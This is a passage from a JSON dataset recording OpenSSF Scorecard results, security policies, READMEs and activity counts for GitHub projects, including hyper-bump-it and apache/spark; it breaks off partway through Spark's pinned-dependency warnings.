                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/1950",
                    "merged_at": "2020-10-27T20:54:56Z"
                }
            }
        ],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "User guideline",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 7,
        "has_generic_policy": true
    },
    {
        "project_name": "plannigan/hyper-bump-it",
        "project_url": "https://github.com/plannigan/hyper-bump-it",
        "SSF": {
            "date": "2024-10-29T22:35:54+07:00",
            "repo": {
                "name": "github.com/plannigan/hyper-bump-it",
                "commit": "97cbff404e4301c805b7fe42b2124149b3e84302"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 8.2,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "15 out of 15 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 5,
                    "reason": "badge detected: Passing",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "Found no human activity in the last 15 changesets",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "project has 0 contributing companies or organizations -- score normalized to 0",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: RenovateBot: renovate.json:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish_release.yml:56"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: pipCommand not pinned by hash: docker/devbox.dockerfile:33",
                        "Warn: pipCommand not pinned by hash: .github/actions/build-dist/action.sh:4",
                        "Warn: pipCommand not pinned by hash: .github/actions/build-dist/action.sh:6",
                        "Warn: pipCommand not pinned by hash: .github/actions/verify-wheel/action.sh:8",
                        "Warn: pipCommand not pinned by hash: .github/actions/verify-wheel/action.sh:17",
                        "Info:  32 out of  32 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   5 out of   5 third-party GitHubAction dependencies pinned",
                        "Info:   1 out of   1 containerImage dependencies pinned",
                        "Info:   0 out of   5 pipCommand dependencies pinned"
                    ],
                    "score": 6,
                    "reason": "dependency not pinned by hash detected -- score normalized to 6",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: all commits (30) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/main.yml:201",
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/publish_release.yml:17",
                        "Info: found token with 'none' permissions: .github/workflows/detect_version_bump.yml:1",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/main.yml:11",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/publish_release.yml:4",
                        "Info: topLevel permissions set to 'read-all': .github/workflows/scorecard.yml:18"
                    ],
                    "score": 10,
                    "reason": "GitHub workflow tokens follow principle of least privilege",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/plannigan/hyper-bump-it/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\n| Version  | Supported          |\n|----------|--------------------|\n| >= 0.4.x | :white_check_mark: |\n| < 0.4.0  | :x:                |\n\n## Reporting a Vulnerability\n\nThe preferred method for reporting a vulnerability is to use GitHub's\n[vulnerability reporting tool][reporting]. Within the report please include details about the\nvulnerability and how to reproduce it. Someone will reply to acknowledge receipt of the that the\nvulnerability report. After an initial investigation of the report, another message will be sent\nwith details about how the maintainers plan to release the fix or asking for more information about\nthe vulnerability report.\n\n## Public Disclosure\n\nA description of the vulnerability will be made public after a new version has been published that\naddresses the issue or within 120 days, whichever occurs first.\n\n[reporting]: https://github.com/plannigan/hyper-bump-it/security/advisories/new\n",
        "project_all_labels": [
            "bug",
            "documentation",
            "duplicate",
            "enhancement",
            "good first issue",
            "help wanted",
            "invalid",
            "question",
            "testing",
            "wontfix"
        ],
        "README_content": "[![CI pipeline status](https://github.com/plannigan/hyper-bump-it/actions/workflows/main.yml/badge.svg?branch=main)][ci]\n[![PyPI](https://img.shields.io/pypi/v/hyper-bump-it)][pypi]\n[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/hyper-bump-it)][pypi]\n[![codecov](https://codecov.io/gh/plannigan/hyper-bump-it/branch/main/graph/badge.svg?token=V4DADJU0BI)][codecov]\n[![Checked with mypy](https://img.shields.io/badge/mypy-checked-blue)][mypy-home]\n[![Code style: black](https://img.shields.io/badge/code%20style-black-black.svg)][black-home]\n[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/plannigan/hyper-bump-it/badge)][scorecard]\n\n# Hyper Bump It\n\nA command line tool for updating the version in project files needed for the next release.\n\n`hyper-bump-it`'s features include:\n\n* Updating the version to a new fully specified value\n* Increasing the version based on a specific version part\n* Optional Git integrations:\n    * Commit changes\n    * Create a new branch or tag\n    * Push changes to a remote repository\n* Customizable search and replacement patterns\n    * Match based on the current version or arbitrary dates\n* Safe by default, but can be overridden:\n    * Request confirmation before editing files\n    * Explicit configuration need to push changes\n    * Won't run if the current branch is not the default\n    * Won't run if there are unstaged changes\n* TOML configuration file (can be part of `pyproject.toml`)\n\n## Examples\n\nThis first example\n\n* Updates to an explicit new version\n* Updates multiple files that had lines matching the search pattern\n* Commits those changes to a newly created branch\n\n```commandline\nhyper-bump-it to 2.3.4\nExecution Plan:\nCreate branch bump_version_to_2.3.4\nSwitch to branch bump_version_to_2.3.4\nUpdate version in configuration file\nUpdate files\n────────────────────────────── example/foo.txt ──────────────────────────────\n--- example/foo.txt\n+++ example/foo.txt\n@@ -1,3 +1,3 @@\n hello\n---1.2.3--abc\n+--2.3.4--abc\n world\n\n Lorem ipsum dolor sit amet, consectetur adipisci elit, sed eiusmod.\n---1.2.3--edf\n+--2.3.4--edf\n Ut enim ad minim veniam, quis nostrum exercitationem ullam corporis.\n\n────────────────────────────── example/bar.txt ──────────────────────────────\n--- example/bar.txt\n+++ example/bar.txt\n@@ -1,3 +1,3 @@\n hello\n-more --1.2.3-- text\n+more --2.3.4-- text\n world\n\nCommit changes: Bump version: 1.2.3 → 2.3.4\nSwitch to branch main\n\nDo you want to perform these actions? [y/n] (n): y\nCreating branch bump_version_to_2.3.4\nSwitching to branch bump_version_to_2.3.4\nUpdating version in configuration file\nUpdating files\nUpdating example/foo.txt\nUpdating example/bar.txt\nCommitting changes: Bump version: 1.2.3 → 2.3.4\nSwitching to branch main\n```\n\nThis second example\n\n* Updates to the next minor version\n* Updates multiple files that had lines matching the search pattern\n* Commits those changes, tags the new commit, and pushes the changes to the remote repository\n\n```commandline\n$ hyper-bump-it by minor\nExecution Plan:\nUpdate version in configuration file\nUpdate files\n────────────────────────────── example/foo.txt ──────────────────────────────\n--- example/foo.txt\n+++ example/foo.txt\n@@ -1,7 +1,7 @@\n hello\n---1.2.3--abc\n+--1.3.0--abc\n world\n \n Lorem ipsum dolor sit amet, consectetur adipisci elit, sed eiusmod.\n---1.2.3--edf\n+--1.3.0--edf\n Ut enim ad minim veniam, quis nostrum exercitationem ullam corporis.\n\n────────────────────────────── example/bar.txt ──────────────────────────────\n--- example/bar.txt\n+++ example/bar.txt\n@@ -1,3 +1,3 @@\n hello\n-more --1.2.3-- text\n+more --1.3.0-- text\n world\n\nCommit changes: Bump version: 1.2.3 → 1.3.0\nTag commit: v1.3.0\nPush commit to origin with tag v1.3.0\n\nDo you want to perform these actions? [y/n] (n): y\nUpdating version in configuration file\nUpdating files\nUpdating example/foo.txt\nUpdating example/bar.txt\nCommitting changes: Bump version: 1.2.3 → 1.3.0\nTagging commit: v1.3.0\nPushing commit to origin with tag v1.3.0\n```\n\n[ci]: https://github.com/plannigan/hyper-bump-it/actions\n[pypi]: https://pypi.org/project/hyper-bump-it/\n[codecov]: https://codecov.io/gh/plannigan/hyper-bump-it\n[mypy-home]: http://mypy-lang.org/\n[black-home]: https://github.com/psf/black\n[scorecard]: https://securityscorecards.dev/viewer/?uri=github.com/plannigan/hyper-bump-it\n",
        "num_commits": 1120,
        "project_age_days": 734,
        "project_created_at": "2022-10-26",
        "latest_updated_at": "2024-10-27",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 3,
        "num_pull": 526,
        "num_issues": 563,
        "num_opening_issue": 8,
        "project_size(kB)": 4871,
        "num_stargazers": 5,
        "num_watchers": 5,
        "num_forks": 1,
        "num_subscribers": 3,
        "SecurityPolicy_created_at": "2023-02-04 15:10:32",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "3e076f240f799dea9ce9c44767dd6412b7130edb",
                "url": "https://github.com/plannigan/hyper-bump-it/commit/3e076f240f799dea9ce9c44767dd6412b7130edb",
                "date": "2023-07-05 12:42:15"
            },
            {
                "commit_id": "906075de6d872537f8aea77533294ee0387b610c",
                "url": "https://github.com/plannigan/hyper-bump-it/commit/906075de6d872537f8aea77533294ee0387b610c",
                "date": "2023-02-04 15:10:32"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism",
            "Projects practice"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "apache/spark",
        "project_url": "https://github.com/apache/spark",
        "SSF": {
            "date": "2024-10-29T21:58:23+07:00",
            "repo": {
                "name": "github.com/apache/spark",
                "commit": "6a36c43604a638f603a3a40c22ee1e6bd3ae8d7e"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 4.3,
            "checks": [
                {
                    "details": [
                        "Warn: binary detected: data/artifact-tests/junitLargeJar.jar:1",
                        "Warn: binary detected: data/artifact-tests/smallJar.jar:1"
                    ],
                    "score": 8,
                    "reason": "binaries present in source code",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: branch 'master' does not require approvers",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Warn: no status checks found to merge onto branch 'master'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no pull request found",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "Found 0/30 approved changesets -- score normalized to 0",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: cloudpipe contributor org/company found, ReactiveX contributor org/company found, smilegator contributor org/company found, meta contributor org/company found, spark-korea contributor org/company found, radlab contributor org/company found, NetEase contributor org/company found, netease contributor org/company found, asakusafw contributor org/company found, py4j contributor org/company found, apple contributor org/company found, awesome-kyuubi contributor org/company found, databricks contributor org/company found, apache @databricks contributor org/company found, conda-forge contributor org/company found, baidu contributor org/company found, amplab contributor org/company found, apache contributor org/company found, data-apis contributor org/company found, mesos contributor org/company found, uc berkeley contributor org/company found, shopee @apache contributor org/company found, apple @apache contributor org/company found, delta-io contributor org/company found, ntt data contributor org/company found, ebay @apache contributor org/company found, OryxProject contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 27 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 0 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/build_and_test.yml:309"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing shell code: unclosed here-document 'EOF': dev/connect-gen-protos.sh:0",
                        "Info: Possibly incomplete results: error parsing shell code: parameter expansion requires a literal: resource-managers/kubernetes/docker/src/main/dockerfiles/spark/entrypoint.sh:0",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:76: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:81: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:91: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:99: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:105: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:115: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:143: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:148: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:158: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:165: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:172: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark.yml:193: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/benchmark.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:782: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:799: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:809: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:816: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:825: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:890: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:908: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:920: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:930: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:937: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:943: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:949: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:988: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:994: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1074: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1087: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1097: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1104: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1113: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:1139: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:63: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:321: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:327: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:341: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:343: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:346: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:523: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:541: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:551: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:560: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build_and_test.yml:574: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/spark/build_and_test.yml/master?enable=pin",
